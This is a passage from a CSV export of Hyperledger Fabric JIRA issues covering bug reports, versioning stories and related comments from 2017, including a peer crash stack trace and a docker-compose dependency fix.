52 71 71 77 73 71 68 77 65 52 71 65 49 85 100 68 119 69 66 47 119 81 69 65 119 73 67 66 68 65 77 66 103 78 86 72 82 77 66 65 102 56 69 65 106 65 65 77 66 48 71 65 49 85 100 10 68 103 81 87 66 66 84 120 115 43 56 85 48 115 78 106 69 56 55 52 49 90 70 114 103 86 57 109 115 104 75 69 50 84 65 102 66 103 78 86 72 83 77 69 71 68 65 87 103 66 81 71 89 77 65 81 49 75 48 111 57 108 117 74 10 69 88 75 69 121 88 69 66 86 108 84 117 51 84 65 106 66 103 78 86 72 82 69 69 72 68 65 97 103 104 104 50 89 88 74 104 90 71 49 104 89 121 53 121 89 87 120 108 97 87 100 111 76 109 108 105 98 83 53 106 98 50 48 119 10 67 103 89 73 75 111 90 73 122 106 48 69 65 119 73 68 82 119 65 119 82 65 73 103 79 51 73 52 52 113 110 76 54 113 43 83 83 86 108 97 65 53 105 121 89 83 70 100 51 121 68 84 55 87 78 67 88 88 90 78 106 76 121 109 10 85 49 115 67 73 72 52 100 118 98 52 105 98 119 73 83 83 109 115 108 74 105 82 55 55 101 118 101 82 119 115 70 49 55 99 100 56 65 108 98 49 90 80 51 119 78 106 84 49 10 45 45 45 45 45 69 78 68 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45]]",,jyellick,mastersingh24,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybw7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,mastersingh24,varadatibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Aug/17 6:00 AM;jyellick;Thanks for another great bug report Varad!

I've put together a CR which should address the problem here:

https://gerrit.hyperledger.org/r/#/c/12135/;;;","05/Aug/17 2:57 AM;mastersingh24;We have had a delay with 1.0.1 so will include [https://gerrit.hyperledger.org/r/c/12145/] with 1.0.1

Thanks to [~jyellick] for the backport

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Event Completions severly delayed post ledger commits,FAB-5607,19938,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dinotone,dinotone,04/Aug/17 6:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Apr/18 2:38 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"Running PTE with Single Network, 8  channels, 2 ccs, 96 threads,  with duration of 60 minutes. After 60 minutes all the transactions have been committed to all ledgers (confirmed via peer logs), yet  20 minutes later PTE still only got EventHub completions for 8 of the 96 threads",HSBN,dinotone,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Aug/17 6:19 AM;dinotone;B70803D1.perf_driver.out;https://jira.hyperledger.org/secure/attachment/11826/B70803D1.perf_driver.out",,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzybwf:",,,,,,,,,,,,,,,,,,,,,,,dinotone,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Nov/17 6:18 AM;dongming;I can recreate this issue with fabric v.1.0.0. But do not see the issue with fabric 448d384e50ba1d929648bbdcd1eaafe00d6750f7 from master branch.;;;","21/Nov/17 11:31 PM;dongming;Leave open until the originator has a fabric image on Z to verify;;;","25/Apr/18 2:39 AM;dongming;Close now since the issue is not seen for a very long time.

Re-open if the issue is seen again with v1.1 or later.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[Daily Tests] Auction Chaincode tests are failing,FAB-5608,19939,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sandp125,rameshthoomu,rameshthoomu,04/Aug/17 7:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Aug/17 10:50 PM,v1.0.0-rc1,,,v1.0.2,,,,,,,,0,,,,,,,"[Daily Tests] Auction Chaincode tests are failing. Observed create channel is successful but Join channel is failed. Below are the logs

[https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-tests-x86_64/39/console]
*01:15:19.624* Error: genesis block file not found open channel0.block: no such file or directory*01:15:19.624* Usage:*01:15:19.624*   peer channel join [flags]*01:15*",,rameshthoomu,sandp125,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybwn:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,sandp125,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Aug/17 10:42 PM;rameshthoomu;Sandeep, I see daily tests are still failing with this error.. Could you please check this and update the status pls.;;;","09/Aug/17 12:14 PM;sandp125;Added a patch for this https://gerrit.hyperledger.org/r/#/c/12275/;;;","11/Aug/17 10:50 PM;rameshthoomu;After patch is merged this issue is fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[Sorry, my bad, wrong JIRA - I will reuse this JIRA item]",FAB-5609,19943,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,JonathanLevi,JonathanLevi,JonathanLevi,04/Aug/17 5:56 PM,23/Jan/20 6:58 AM,28/Oct/23 3:00 AM,23/Jan/20 6:58 AM,,,,,,,,,,,,0,stale-item,,,,,,,,JonathanLevi,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,ghx-label-7,,StockMarketFabric,To Do,,,Unset,,,,"1|hzybxj:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,JonathanLevi,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:58 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deprecate chaincode event registration in fabric,FAB-5612,19949,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,pmullaney,pmullaney,pmullaney,04/Aug/17 11:09 PM,23/Jan/20 6:58 AM,28/Oct/23 3:00 AM,23/Jan/20 6:58 AM,v1.1.0,,,,,fabric-peer,,,,,,0,stale-item,,,,,,The sdk should now consume block events and generate the chaincode events that they carry  for the sdk clients. Using the block as the source of events should allow the relative time ordering of events to be determined and avoid a potential issue for clients.,,pmullaney,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybyf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,pmullaney,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/17 3:40 AM;jimthematrix;[~pmullaney] this is already supported by the EventHub, registerChaincodeEvent(), is that not sufficient?;;;","29/Aug/17 4:07 AM;pmullaney;as far as I knew, the mechanism to register directly with the fabric is still present in fabric-peer. This won't return the expected results as no chaincode events are sourced via the peer any longer. I'd like to either fail the registration or take it out of the protobuf definition. Its causing confusion as I have seen sdk implementations attempting to use it.;;;","23/Jan/20 6:58 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deprecate rejection event,FAB-5613,19951,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,pmullaney,pmullaney,pmullaney,04/Aug/17 11:16 PM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,,,,,,fabric-peer,,,,,,0,,,,,,,Rejection events were disabled in v0.6 due to the endorsement phase being a synchronous operation and the return value now determined the partial validity of the transaction. There is still potential to fail during ordering so a new tx invalid event should be created for that purpose.,,mastersingh24,pmullaney,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybyn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,mastersingh24,pmullaney,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/17 3:38 AM;jimthematrix;[~pmullaney] the client gets the ""valid"" status on the callback to the per-transaction listener, is that not sufficient?;;;","29/Aug/17 6:28 AM;pmullaney;I think it is completely sufficient and thus deprecating rejection events makes sense. But to your point, the comment about needing a new invalid event does not make sense.;;;","30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Version to Orderer top-level messages,FAB-5614,19954,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,,binhn,binhn,04/Aug/17 11:52 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,05/Sep/17 11:46 PM,,,,WON'T FIX,,fabric-orderer,,,,,,0,,,,,,,"Add ""int32 version"" to SeekInfo, DeliverResponse, and ConfigEnvelope to handle compatibility.

See more detail in the story FAB-5556

 ",,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybyv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Version to gossip top-level messages,FAB-5615,19955,13115,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,binhn,binhn,04/Aug/17 11:56 PM,30/Jul/19 10:08 AM,28/Oct/23 3:00 AM,30/Jul/19 10:08 AM,,,,WON'T FIX,,fabric-gossip,,,,,,0,,,,,,,"Add ""int32 version"" to GossipMessage and handle compatibility.

See story FAB-5556 for more info.",,binhn,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybz3:",,,,,,,,,,,,,,,,,,,,,,,binhn,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Aug/17 4:54 AM;yacovm;Do we have compatibility issues with mixed sets of peers from v1.0 and v1.1?
[~C0rWin] I am under the impression (correct me please if I'm wrong) that the side DB new messages would simply be ""ignored"" by peers from v1.0 when they reach the [message handling|https://github.com/hyperledger/fabric/blob/release/gossip/gossip/gossip_impl.go#L349] logic of v1.0 
and the addition of fields of the side DB would simply be ""invisible"" to peers from v1.0

Do we still need to add a version? Perhaps we should delay this as much as possible, until we find such a need? 

1 more thing that is un-clear to me: why do all components have the same protocol version? (1.1 in v1.1)
I would envision each ""interaction"" have its own version - for example, a Deliver API that has its own version and gossip protocol has its own version.

wdyt Artem, Binh?
;;;","16/Aug/17 11:21 AM;binhn;This has become internal to gossip now to determine whether a version is needed at handshake and no longer a requirement from the protocol.

I don't really see the need for this as we have changed how we handle compatibility in v1.1. We may need to revisit in the next release if incompatibility in gossip communication arises. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add version to Block,FAB-5616,19956,13115,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,,binhn,binhn,04/Aug/17 11:59 PM,30/Jul/19 10:07 AM,28/Oct/23 3:00 AM,30/Jul/19 10:07 AM,,,,WON'T FIX,,fabric-ledger,,,,,,0,,,,,,,"Add ""int32 version"" to Block and handle compatibility of block versions.

See story FAB-5556 for more info.",,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybzb:",,,,,,,,,,,,,,,,,,,,,,,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add version to Event,FAB-5617,19957,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,binhn,binhn,binhn,05/Aug/17 12:00 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,09/Jan/18 1:18 AM,,,,v1.1.0,WON'T FIX,fabric-peer,,,,,,0,,,,,,,"Add ""int32 version"" to Event and handle compatibility of different versions.

See story FAB-5556 for more info.",,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybzj:",,,,,,,,,,,,,,,,,,,,,,,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Aug/17 6:51 AM;binhn;In review  https://gerrit.hyperledger.org/r/#/c/12267/;;;","09/Jan/18 1:19 AM;Clayton Sims;closing down 1.1 alpha.  moved to deliver based events;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Hyperledge Fabric Samples directory cannot contain a space,FAB-5618,19958,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,eacoeytaux,eacoeytaux,eacoeytaux,05/Aug/17 12:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Oct/17 11:55 PM,v1.0.2,,,,,fabric-docs,,,,,,0,Documentation,,,,,,"While going through the tutorials on [https://hyperledger-fabric.readthedocs.io/en/latest/samples.html] I cloned the git repo to a folder than had a space in it, and thus ran into errors while running the byfn.sh script.  While it is an easy issue to bypass it was unclear as to what was causing the problem, it might be worthwhile to state in the tutorial the directory for the samples should not contain spaces.",,eacoeytaux,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybzr:",,,,,,,,,,,,,,,,,,,,,,,eacoeytaux,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Sep/17 11:30 PM;eacoeytaux;Link to change set: [https://gerrit.hyperledger.org/r/#/c/13365/];;;","14/Sep/17 2:47 AM;markparz;[~eacoeytaux] I added a couple maintainers to your CR to verify. Thanks !;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Process transaction message version,FAB-5619,19959,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,binhn,binhn,binhn,05/Aug/17 12:14 AM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,,,,Future,,fabric-peer,,,,,,0,,,,,,,Each transaction proposal contains a message version in ChannelHeader.Version. We need to make use of the version to manage compatibility,,binhn,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6122,,,,,,,,,"1|hzybzz:",,,,,,,,,,,,,,,,,,,,,,,binhn,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Logging settings for peer are not flexible enough,FAB-5620,19960,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,bur,bur,05/Aug/17 1:00 AM,02/Nov/18 3:10 AM,28/Oct/23 3:00 AM,02/Nov/18 3:10 AM,v1.0.0,,,,,fabric-peer,,,,,,0,common-components,Debug,Logging,Usability,,,"Currently, the log level for the peer can be defined in core.yaml logging section with some additional fine grained log settings for some fixed loggers such as gossip, ledger, grpc, ... .

Those loggers are hardcoded in the peer node here:

https://github.com/hyperledger/fabric/blob/release/peer/node/start.go#L246

 

However, in case we want to enable debug logging for some system chaincode, e.g. vscc, currently one has to set the peer log level to debug. This results super verbose logging of the peer. 

It should be possible to add any logger to the logging section of the core.yaml in order to override the peer logging settings. 

 

 

 ",,bur,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-12357,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyc07:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,bur,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Nov/18 3:10 AM;wlahti;This has been addressed via FAB-12357 which updates the peer and orderer to use a logging specification for the peer.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger file version,FAB-5621,19961,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Won't Do,manish-sethi,binhn,binhn,05/Aug/17 2:16 AM,30/Jul/19 11:33 AM,28/Oct/23 3:00 AM,30/Jul/19 11:33 AM,,,,Future,,fabric-ledger,,,,,,0,,,,,,,"We need a version indicator <major>.<minor> on each ledger file and handle compatibility.

See story FAB-5556 for more info.",,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6122,,,,,,,,,"1|hzyc0f:",,,,,,,,,,,,,,,,,,,,,,,binhn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SDK to set message version to 1.1,FAB-5623,19963,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,MichaelWang,binhn,binhn,05/Aug/17 3:14 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/18 7:16 AM,,,,,,fabric-sdk-node,fabric-sdk-py,,,,,0,,,,,,,"In release 1.1, we want to set the protocol message version to 1.1.  See story FAB-5556 for more info.",,binhn,harrisob@us.ibm.com,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5624,FABG-468,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6122,,,,,,,,,"1|hzyc0v:",,,,,,,,,,,,,,,,,,,,,,,binhn,harrisob@us.ibm.com,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/17 11:19 PM;rickr;Version can't be set to 1.1 because it's an integer;;;","09/Aug/17 6:47 AM;binhn;[~rickr] see the doc link on the story;;;","27/Mar/18 4:00 AM;harrisob@us.ibm.com;How would the SDK's do this ? Not even sure what is being asked ?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Java SDK to set message version to 1.1,FAB-5624,19964,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,rickr,rickr,rickr,05/Aug/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Sep/17 11:37 PM,,,,WON'T FIX,,fabric-sdk-java,,,,,,0,,,,,,,"In release 1.1, we want to set the protocol message version to 1.1.  See story FAB-5556 for more info.",,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABG-468,,,,FAB-5623,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc13:",,,,,,,,,,,,,,,,,,,,,,,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Sep/17 11:35 PM;rickr;https://docs.google.com/document/d/1CbB8dR0GNnHi7UekIDpsySCBXkPTtKk0m53CIzJbU-A/edit#heading=h.4atsg7w1xphx

 

3.2 Protocol Version
The current protocol version is in ChannelHeader.Version. This design will not use this field; however, we will not remove the field just yet. We can deprecate if we don’t actually need it.

Some SDK sets ChannelHeader.Version to 1, but neither the Peer nor Orderer checks this version field, so the SDK may ignore this field in v1.1.

 

By this I'm taking this to be a _NO-OP_ as a SDK todo.

[~mastersingh24] [~jimthematrix];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing index checks in endorser.go,FAB-5627,19970,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,05/Aug/17 6:01 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 9:32 PM,v1.0.0,v1.0.1,,v1.0.1,,fabric-peer,,,,,,0,,,,,,,"There is a missing check of *cis.ChaincodeSpec.Input.Args*'s length

Can cause a peer to crash:
{code}
panic: runtime error: index out of range

goroutine 259 [running]:
panic(0xbf31c0, 0xc4200100c0)
        /home/yacovm/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/core/endorser.(*Endorser).disableJavaCCInst(0xc42026e950, 0xc421b56300, 0xc421b5e000, 0x0, 0x4)
        /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:189 +0x275
github.com/hyperledger/fabric/core/endorser.(*Endorser).simulateProposal(0xc42026e950, 0x7feff1964788, 0xc421afbdd0, 0x0, 0x0, 0xc421b50dc0, 0x40, 0xc421afbec0, 0xc421b12e60, 0xc421b56300, ...)
        /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:216 +0x2e0
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal(0xc42026e950, 0x7feff1964788, 0xc421afbdd0, 0xc421afbec0, 0x0, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/core/endorser/endorser.go:454 +0x70c
github.com/hyperledger/fabric/protos/peer._Endorser_ProcessProposal_Handler(0xc88320, 0xc42026e950, 0x7feff1964788, 0xc421afbdd0, 0xc421b12dc0, 0x0, 0x0, 0x0, 0xd6e1c3, 0xd6e1c2)
        /opt/gopath/src/github.com/hyperledger/fabric/protos/peer/peer.pb.go:112 +0x27d
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC(0xc4201a28c0, 0x131a540, 0xc421b08580, 0xc4201b0100, 0xc420225c50, 0x12f8ea0, 0xc421afbe60, 0x0, 0x0)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:797 +0xd14
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc4201a28c0, 0x131a540, 0xc421b08580, 0xc4201b0100, 0xc421afbe60)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:997 +0x7a0
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc421b109c0, 0xc4201a28c0, 0x131a540, 0xc421b08580, 0xc4201b0100)
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:561 +0xab
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
        /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:562 +0xa3

{code}",,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc2n:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Aug/17 6:26 PM;mastersingh24;[https://gerrit.hyperledger.org/r/#/c/12155/] for master

[https://gerrit.hyperledger.org/r/12165] for release;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Display additional error status in the peer CLI,FAB-5628,19971,18070,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,05/Aug/17 7:26 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Aug/17 11:29 PM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,"The peer CLI only dumps the status code, not the full broadcast reply in an error message.

It's very useful for users to see the reason for the rejection, so this should be printed as well.",,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc2v:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Enhance RWSet builder to support transaction simulation,FAB-5630,19973,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,05/Aug/17 1:37 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Aug/17 7:29 PM,,,,,,,,,,,,0,,,,,,,Enhance read-write set builder to capture the details for private and hashed data during transaction simulation,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyc3b:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make sure couchdb is running while starting peer for FabCar sample application.,FAB-5631,19976,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,06/Aug/17 6:53 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Aug/17 9:31 PM,,,,,,,,,,,,0,,,,,,,"Currently {{docker-compose.yaml}} file of the basic-network setup doesn't defines dependencies between peer and couch db container. Which might lead to the errors in cases where it takes few moments longer to couchdb container to start, for example issue reported at [SO|https://stackoverflow.com/questions/45530104/hyperledger-fabric-fabcar-error/45530696#45530696].

{code}
  peer0.org1.example.com:
    container_name: peer0.org1.example.com
    image: hyperledger/fabric-peer:x86_64-1.0.0
    environment:
      - CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock
      - CORE_PEER_ID=peer0.org1.example.com
